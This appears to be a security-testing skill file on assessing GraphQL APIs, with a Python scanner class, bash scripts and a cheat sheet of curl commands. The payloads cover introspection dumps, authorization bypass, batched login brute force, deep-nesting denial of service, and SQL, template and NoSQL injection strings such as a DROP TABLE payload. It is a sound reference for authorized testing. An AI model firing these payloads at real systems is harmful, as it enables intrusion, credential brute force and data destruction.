---
name: wstg-apit-99
description: "Testing GraphQL"
category: api-testing
owasp_id: WSTG-APIT-99
version: "1.0.0"
author: cyberstrike-official
tags: [api, rest, graphql, soap, wstg, apit]
tech_stack: []
cwe_ids: []
chains_with: [wstg-apit-00, wstg-apit-01]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-apit-01: "GraphQL introspection combined with recon exposure hands the attacker a complete, auto-documented schema of every query/mutation/type — eliminating the need for endpoint fuzzing and speeding discovery of hidden/admin-only operations (High)"
---

# wstg-apit-99

## Test ID

WSTG-APIT-99

## Test Name

Testing GraphQL APIs

## High-Level Description

GraphQL is a query language for APIs that allows clients to request exactly the data they need. While flexible, GraphQL APIs introduce unique security challenges including introspection, batching attacks, nested queries, and authorization bypass opportunities.

---

## What to Check

- [ ] Introspection enabled
- [ ] Authorization per field/type
- [ ] Query depth limits
- [ ] Query complexity limits
- [ ] Batching vulnerabilities
- [ ] Injection attacks
- [ ] Information disclosure

---

## How to Test

### Step 1: Find GraphQL Endpoints

```bash
#!/bin/bash
TARGET="target.com"

endpoints=(
    "/graphql"
    "/graphql/console"
    "/graphiql"
    "/graphql/v1"
    "/api/graphql"
    "/gql"
    "/query"
)

for endpoint in "${endpoints[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "https://$TARGET$endpoint" \
        -H "Content-Type: application/json" \
        -d '{"query":"{ __typename }"}')

    if [ "$status" != "404" ]; then
        echo "[FOUND] $endpoint: $status"
    fi
done
```

### Step 2: Test Introspection

```bash
# Full introspection query
curl -s -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}' | jq '.'

# Get all queries and mutations
curl -s -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query": "{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"}' | jq '.'
```

### Step 3: GraphQL Security Tester

```python
#!/usr/bin/env python3
import requests
import json

class GraphQLTester:
    def __init__(self, url, headers=None):
        self.url = url
        self.session = requests.Session()
        if headers:
            self.session.headers.update(headers)
        self.findings = []

    def query(self, query, variables=None):
        """Execute GraphQL query"""
        payload = {"query": query}
        if variables:
            payload["variables"] = variables

        response = self.session.post(
            self.url,
            json=payload,
            headers={"Content-Type": "application/json"}
        )
        return response.json()

    def test_introspection(self):
        """Test if introspection is enabled"""
        print("[*] Testing introspection...")

        query = """
        {
            __schema {
                types { name }
                queryType { fields { name } }
                mutationType { fields { name } }
            }
        }
        """

        result = self.query(query)

        if 'errors' not in result or '__schema' in str(result):
            print("[VULN] Introspection enabled!")
            self.findings.append({
                "issue": "GraphQL introspection enabled",
                "severity": "Medium"
            })

            # Extract types
            if 'data' in result and result['data']:
                schema = result['data'].get('__schema', {})
                types = schema.get('types', [])
                print(f"  Found {len(types)} types")

                # List queries and mutations
                query_type = schema.get('queryType', {})
                if query_type:
                    queries = [f['name'] for f in query_type.get('fields', [])]
                    print(f"  Queries: {queries[:10]}")

        else:
            print("[OK] Introspection disabled")

    def test_authorization(self, queries):
        """Test authorization on queries"""
        print("\n[*] Testing authorization...")

        for query_name, query in queries.items():
            result = self.query(query)

            if 'data' in result and result['data']:
                print(f"[POTENTIAL] Accessible: {query_name}")
            elif 'errors' in result:
                error_msg = str(result['errors'])
                if 'unauthorized' in error_msg.lower() or 'forbidden' in error_msg.lower():
                    print(f"[OK] Protected: {query_name}")
                else:
                    print(f"[CHECK] Error on {query_name}: {error_msg[:50]}")

    def test_depth_limit(self, max_depth=10):
        """Test query depth limits"""
        print("\n[*] Testing depth limits...")

        # Build nested query
        nested = "{ users "
        for i in range(max_depth):
            nested += "{ friends "
        nested += "{ id } " + "} " * max_depth + "}"

        result = self.query(nested)

        if 'errors' in result:
            error = str(result['errors'])
            if 'depth' in error.lower() or 'complexity' in error.lower():
                print(f"[OK] Depth limit enforced")
            else:
                print(f"[WARN] Query failed but not due to depth limit")
        else:
            print(f"[VULN] No depth limit (tested {max_depth} levels)")
            self.findings.append({
                "issue": "No query depth limit",
                "severity": "Medium"
            })

    def test_batching(self):
        """Test batch query vulnerabilities"""
        print("\n[*] Testing batching...")

        # Batch login attempts (for brute force)
        batch_query = """
        query {
            q1: login(email: "test1@test.com", password: "pass1") { token }
            q2: login(email: "test2@test.com", password: "pass2") { token }
            q3: login(email: "test3@test.com", password: "pass3") { token }
        }
        """

        result = self.query(batch_query)

        if 'errors' not in result or 'data' in result:
            print("[WARN] Batching allowed - potential for brute force")
            self.findings.append({
                "issue": "Batching allows brute force",
                "severity": "Medium"
            })

    def test_injection(self):
        """Test for injection vulnerabilities"""
        print("\n[*] Testing injection...")

        payloads = [
            '{ user(id: "1 OR 1=1") { id } }',
            '{ user(id: "1\'; DROP TABLE users--") { id } }',
            '{ user(id: "${7*7}") { id } }',
            '{ user(id: "{{7*7}}") { id } }',
        ]

        for payload in payloads:
            result = self.query(payload)
            if 'errors' in result:
                error = str(result['errors'])
                if 'sql' in error.lower() or 'syntax' in error.lower():
                    print(f"[VULN] SQL error disclosure")
                    self.findings.append({
                        "issue": "SQL injection possible",
                        "severity": "Critical"
                    })

    def generate_report(self):
        print("\n" + "="*50)
        print("GRAPHQL SECURITY REPORT")
        print("="*50)

        if not self.findings:
            print("\nNo issues found.")
            return

        print(f"\nFindings: {len(self.findings)}")
        for f in self.findings:
            print(f"\n  [{f['severity']}] {f['issue']}")

# Usage
tester = GraphQLTester(
    "https://target.com/graphql",
    {"Authorization": "Bearer token"}
)

tester.test_introspection()
tester.test_authorization({
    "users": "{ users { id email } }",
    "admin": "{ admin { secrets } }",
})
tester.test_depth_limit()
tester.test_batching()
tester.test_injection()
tester.generate_report()
```

---

## Tools

| Tool                | Description          |
| ------------------- | -------------------- |
| **GraphQL Voyager** | Schema visualization |
| **Altair**          | GraphQL client       |
| **InQL**            | Burp Suite extension |
| **graphql-cop**     | Security auditor     |

---

## Example Commands/Payloads

### Ready-to-Use GraphQL Cheat Sheet

```bash
GQL="https://{target}/graphql"

# Full introspection dump (types, fields, mutations)
curl -s -X POST "$GQL" -H "Content-Type: application/json" \
    -d '{"query": "{ __schema { types { name fields { name type { name } } } } } "}' | jq '.'

# List only queries/mutations for a quick attack-surface overview
curl -s -X POST "$GQL" -H "Content-Type: application/json" \
    -d '{"query": "{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"}' | jq '.'

# Field-level authorization bypass — try an admin-only field with a low-priv token
curl -s -X POST "$GQL" -H "Authorization: Bearer $LOW_PRIV_TOKEN" -H "Content-Type: application/json" \
    -d '{"query": "{ admin { secrets users { id email } } }"}'

# Batching attack — brute-force multiple logins in a single request
curl -s -X POST "$GQL" -H "Content-Type: application/json" -d '{
  "query": "query { q1: login(email:\"a@test.com\",password:\"pass1\"){token} q2: login(email:\"a@test.com\",password:\"pass2\"){token} q3: login(email:\"a@test.com\",password:\"pass3\"){token} }"
}'

# Deep nested query for DoS / missing depth-limit check
python3 -c "
depth = 15
q = '{ users ' + '{ friends ' * depth + '{ id } ' + '} ' * depth + '}'
print(q)
" > deep_query.txt
curl -s -X POST "$GQL" -H "Content-Type: application/json" \
    -d "{\"query\": \"$(cat deep_query.txt)\"}"

# Injection via string arguments
for p in '1 OR 1=1' "1'; DROP TABLE users--" '${7*7}' '{{7*7}}'; do
  curl -s -X POST "$GQL" -H "Content-Type: application/json" \
    -d "{\"query\": \"{ user(id: \\\"$p\\\") { id } }\"}"
done

# GraphQL Voyager / InQL for schema visualization (via Burp extension) or CLI
graphql-cop -t "$GQL"

# GET-based injection point (spec allows GET; some WAFs/filters only cover POST)
curl -s "$GQL?query={__schema{types{name}}}"
curl -s "$GQL?query=query%20%7B%20user(id:%221%22)%20%7B%20id%20name%20%7D%20%7D"

# Error-based schema enumeration when introspection is disabled — GraphQL "did you
# mean" suggestions leak field/type names one guess at a time
curl -s -X POST "$GQL" -H "Content-Type: application/json" -d '{"query":"{ usr { id } }"}'
# -> "Cannot query field \"usr\" on type \"Query\". Did you mean \"user\"?"

# Bypass disabled introspection entirely by reconstructing the schema from error
# suggestions (clairvoyancex) or fingerprint the GraphQL engine first (graphw00f)
# graphw00f -d -f -t "$GQL"
# clairvoyance -o schema.json -w /usr/share/wordlists/graphql.txt "$GQL"

# JSON-list based batching (array of operations in one HTTP request)
curl -s -X POST "$GQL" -H "Content-Type: application/json" -d '[{"query":"{ q1: login(email:\"a@test.com\",password:\"p1\"){token} }"},{"query":"{ q2: login(email:\"a@test.com\",password:\"p2\"){token} }"}]'

# NoSQL injection via $regex inside a string/search argument (MongoDB-backed resolvers)
curl -s -X POST "$GQL" -H "Content-Type: application/json" -d '{
  "query": "{ users(search: \"{ \\\"email\\\": { \\\"$regex\\\": \\\".*\\\" } }\") { id email } }"
}'

# Brute-force / fuzz mutations with CrackQL (handles GraphQL-specific rate-limit quirks)
# crackql -u "$GQL" -f mutation_login.json -w passwords.txt
```

### Detection Patterns

| Signal                                          | Meaning                          |
| ---------------------------------------------------| ------------------------------------ |
| `__schema` resolves without auth                    | Introspection enabled in production  |
| Admin/privileged field resolves with low-priv token   | Missing field-level authorization    |
| All aliased batch mutations execute in one request    | No batching limit — brute-force enabler |
| Deeply nested query returns data instead of an error   | No query depth/complexity limiting  |
| SQL/template error text in response                    | Injection via GraphQL argument      |

---

## Remediation

```python
# Disable introspection in production
from graphene import Schema

schema = Schema(query=Query, mutation=Mutation)

# Production settings
if not DEBUG:
    schema.introspection = False

# Implement depth limiting
from graphene.validation import depth_limit_validator

schema.execute(query, validation_rules=[depth_limit_validator(5)])
```

---

## Risk Assessment

| Finding               | CVSS | Severity |
| --------------------- | ---- | -------- |
| Introspection enabled | 5.3  | Medium   |
| No depth limit (DoS)  | 5.3  | Medium   |
| Authorization bypass  | 7.5  | High     |
| SQL injection         | 9.8  | Critical |

---

## CWE Categories

| CWE ID | Title | Description |
| --- | --- | --- |
| **CWE-200** | Exposure of Sensitive Information to an Unauthorized Actor | Schema/type disclosure via introspection |
| **CWE-285** | Improper Authorization | Missing field/type-level authorization checks |
| **CWE-770** | Allocation of Resources Without Limits or Throttling | No query depth/complexity limit or batching cap — DoS |
| **CWE-89** | SQL Injection | Unsanitized string arguments passed to resolvers |

---

## References

- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [graphql-cop - GraphQL Security Auditor](https://github.com/dolevf/graphql-cop)
- [PortSwigger - GraphQL API Vulnerabilities](https://portswigger.net/web-security/graphql)
- [PayloadsAllTheThings - GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)

---

## Checklist

```
[ ] GraphQL endpoint found
[ ] Introspection tested
[ ] Authorization checked
[ ] Depth limits tested
[ ] Batching tested
[ ] Injection tested
[ ] Findings documented
```
